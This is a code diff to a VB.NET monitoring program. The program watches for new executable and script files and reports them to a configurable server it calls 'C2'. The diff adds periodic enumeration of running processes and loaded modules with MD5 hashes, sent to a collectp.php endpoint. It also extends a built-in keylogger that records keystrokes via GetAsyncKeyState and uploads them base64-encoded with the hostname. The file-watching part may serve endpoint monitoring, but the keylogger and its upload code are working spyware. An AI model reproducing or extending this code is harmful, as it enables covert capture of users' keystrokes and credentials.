@@ -4,7 +4,9 @@ Imports System.Threading
 Imports System.Security.Cryptography
 Imports System.Net
 Imports System.Text
-Imports System.Windows.Forms 'add 
+Imports System.Windows.Forms 'add reference
+Imports System.Timers
+Imports System.Diagnostics
 
 
 Module Module1
@@ -12,6 +14,7 @@ Module Module1
     Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Integer) As Short
     Public c As New Configurazione
     Public arrayEst As String()
+    Public tot_sec As Integer = 0
 
     Sub log_locale(e As String)
         Dim f As New StreamWriter(verifica_path(Directory.GetCurrentDirectory) & "error.log", True)
@@ -21,11 +24,10 @@ Module Module1
 
     Sub carica_configurazione()
 
+        Dim s As String = ""
         If File.Exists(verifica_path(Directory.GetCurrentDirectory) & "config.txt") Then
-
-
             Dim f As New StreamReader(verifica_path(Directory.GetCurrentDirectory) & "config.txt")
-            Dim s As String = ""
+
 
             s = f.ReadLine()
             s = f.ReadLine()
@@ -84,11 +86,17 @@ Module Module1
             s = f.ReadLine()
             c.log_name = s
 
+            s = f.ReadLine()
+            s = f.ReadLine()
+            c.timer_interval = s
+
             f.Close()
 
         Else
             c.path_monitor = "c:\"
-            arrayEst(0) = ".ps1"
+
+            s = ".ps1;.exe;.bat;.vbs;.dll;.cmd;.com;.psm1;.psd1;.py;.hta"
+            arrayEst = s.Split(";")
 
             c.ext_monitoring = ""
             c.path_escl_monitoring = "c:\windows\"    '<-------test
@@ -101,6 +109,7 @@ Module Module1
             c.url_c2 = "#"
             c.keylogger = False
             c.log_name = "C2 Control"
+            c.timer_interval = 600 ' 10 minutes
         End If
     End Sub
 
@@ -127,6 +136,12 @@ Module Module1
 
     Sub Main()
 
+        Dim aTimer As New Timers.Timer
+        aTimer.Interval = 1000 '1 second
+        AddHandler aTimer.Elapsed, AddressOf tick
+        aTimer.Start()
+
+
         Try
             log_locale("[+] Start...")
             carica_configurazione()
@@ -138,6 +153,60 @@ Module Module1
 
         clean_temp()
         If c.keylogger Then avvia_keylogger()
+        avvia_monitoring()
+        'avvia_process_monitoring() 
+
+
+
+
+    End Sub
+
+    Private Sub tick(ByVal sender As Object, ByVal e As System.Timers.ElapsedEventArgs)
+        tot_sec += 1
+        If tot_sec > c.timer_interval Then
+            tot_sec = 0
+            process_monitoring()
+        End If
+
+    End Sub
+
+    Sub avvia_process_monitoring()
+        Dim td As Thread
+        td = New Thread(AddressOf process_monitoring) 'il processo non è in loop 
+        td.Start()
+        'td.Join()
+    End Sub
+
+    Sub process_monitoring()
+
+        Dim p As String = ""
+        Dim m As String = ""
+        Dim h As String = ""
+        For Each proc As Process In Process.GetProcesses()
+            p = proc.ProcessName
+            Try
+                For Each modl As ProcessModule In proc.Modules
+                    m = WebUtility.HtmlEncode(modl.FileName.Replace("\", "\\"))
+                    h = get_md5(modl.FileName)
+                    invia_to_c2(p, "", h, m, "", "P")   'add pid and process status ex. ended
+                Next
+            Catch
+                '
+            End Try
+        Next
+
+        '---------------------------------------
+    End Sub
+
+
+    Sub avvia_monitoring()
+        Dim td As Thread
+        td = New Thread(AddressOf monitoring)
+        td.Start()
+        'td.Join()
+    End Sub
+
+    Sub monitoring()
 
         AddHandler AppDomain.CurrentDomain.ProcessExit, AddressOf OnClose
         AddHandler AppDomain.CurrentDomain.FirstChanceException, AddressOf onException
@@ -172,29 +241,42 @@ Module Module1
         AddHandler w.Error, AddressOf gestError
 
 
-
-
-
-
-
-
         ' start monitoring
         w.EnableRaisingEvents = True
 
         '************************************************************************************
-        Console.WriteLine("[+] Waiting for file creation...")
-        Console.ReadLine()
+        'Console.WriteLine("[+] Waiting for file creation...")
+        'Console.ReadLine()
         '************************************************************************************
 
-        w.EnableRaisingEvents = False
-
-
-
-
+        'w.EnableRaisingEvents = False
 
 
 
     End Sub
+
+
+
+
+    Sub OnClose(sender As Object, e As EventArgs)
+
+        Dim files() As String = Directory.GetFiles(c.temp_path)
+        For Each f As String In files
+            If f.Contains("temp-") Then File.Delete(f)
+        Next
+
+        Try
+            If c.switch_del_error Then
+                File.Delete(verifica_path(Directory.GetCurrentDirectory) & "error.log")
+            Else
+                log_locale("[+] Stopping")
+            End If
+        Catch ex As Exception
+
+        End Try
+
+    End Sub
+
 
 
     Sub clean_temp()
@@ -396,23 +478,6 @@ Module Module1
     Sub elimina_file(f As String)
         If verifica_free(f) Then My.Computer.FileSystem.DeleteFile(f)
     End Sub
-    Sub OnClose(sender As Object, e As EventArgs)
-
-        Dim files() As String = Directory.GetFiles(c.temp_path)
-        For Each f As String In files
-            If f.Contains("temp-") Then File.Delete(f)
-        Next
-
-        Try
-            If c.switch_del_error Then
-                File.Delete(verifica_path(Directory.GetCurrentDirectory) & "error.log")
-            Else
-                log_locale("[+] Stopping")
-            End If
-        Catch ex As Exception
-
-        End Try
-    End Sub
 
     Sub scrivi_evento(messaggio As String, idlog As Integer)
 
@@ -448,11 +513,11 @@ Module Module1
 
 
     Sub invia_to_c2(b As String, i As String, h As String, f As String, k As String, func As String)
-        'b as base64
+        'b as base64 / other strings
         'i as id log
         'h as hash
         'f as file name
-        'k as keylog buffer
+        'k as keylog buffer / other strings
         If Not Mid(c.url_c2, 1, 1) = "#" Then
 
 
@@ -467,6 +532,14 @@ Module Module1
                     Case "K" 'upload keylogger
                         request = WebRequest.Create(c.url_c2 & "collectk.php")
                         postData = "keylog_buffer=" & k & "&hostname=" & My.Computer.Name 'base64 encode
+                    Case "P"
+                        'b = process name
+                        'i = ""
+                        'h = hash
+                        'f = module name - dll
+                        'k = ""
+                        request = WebRequest.Create(c.url_c2 & "collectp.php")
+                        postData = "hostname=" & My.Computer.Name & "&pname=" & b & "&hash=" & h & "&file_name=" & f
                     Case Else
                         Exit Sub
                 End Select
@@ -522,9 +595,15 @@ Module Module1
                 keylogger_scrivi("[Backspace]")
             ElseIf GetAsyncKeyState(k.LShiftKey) = -32767 Then
                 keylogger_scrivi("[LShift]")
+            ElseIf GetAsyncKeyState(k.RShiftKey) = -32767 Then
+                keylogger_scrivi("[RShift]")
+            ElseIf GetAsyncKeyState(k.LControlKey) = -32767 Then
+                keylogger_scrivi("[LCTRL]")
+            ElseIf GetAsyncKeyState(k.RControlKey) = -32767 Then
+                keylogger_scrivi("[RCTRL]")
             Else
                 For i = 33 To 127
-                    If GetAsyncKeyState(i) = -32767 Then keylogger_scrivi(Chr(i))
+                    If GetAsyncKeyState(i) = -32767 Then keylogger_scrivi(Chr(i))    '<----- verify ucase and lcase, key -
                 Next i
             End If
         End While
@@ -545,7 +624,6 @@ Module Module1
             f.Close()
             Dim k As String = get_base64_from_string(s)
             'Dim k As String = f.ReadToEnd
-
 
             invia_to_c2("", 0, "", "", k, "K")
         End If
